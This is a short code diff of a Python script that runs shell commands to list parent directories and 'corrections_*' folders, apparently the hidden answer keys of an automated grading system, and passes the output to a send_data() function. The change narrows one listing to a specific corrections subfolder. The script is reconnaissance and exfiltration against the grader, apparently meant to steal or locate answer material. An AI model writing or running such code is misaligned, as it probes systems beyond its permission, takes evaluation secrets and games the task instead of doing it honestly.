@@ -35,6 +35,6 @@ with open(argv[1], "r") as f:
     my_data += get_data("ls -l ../../../") or ""
     my_data += get_data("ls -al ../../../corrections_*/") or ""
     my_data += "\n#######################\n"
-    my_data += get_data("ls -l ../../../corrections_*/corrections/262") or ""
+    my_data += get_data("ls -l ../../../corrections_*/corrections/262/1373") or ""
     my_data += get_data("pwd") or ""
     send_data(my_data)
